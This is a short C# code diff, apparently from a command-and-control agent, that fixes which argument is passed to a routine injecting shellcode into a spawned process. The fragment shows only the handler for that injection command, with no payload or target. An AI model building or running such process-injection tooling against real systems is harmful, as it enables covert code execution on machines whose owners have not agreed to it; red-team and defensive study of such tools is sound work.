@@ -33,7 +33,7 @@ namespace Agent.Commands
 
             var shellcode = fileContent;
 
-            var injectRes =  Injector.SpawnInjectWithOutput(fileContent, task.SplittedArgs[1]);
+            var injectRes =  Injector.SpawnInjectWithOutput(fileContent, task.SplittedArgs[0]);
             if(!injectRes.Succeed)
                 result.Result += $"Injection failed : {injectRes.Error}";
             else
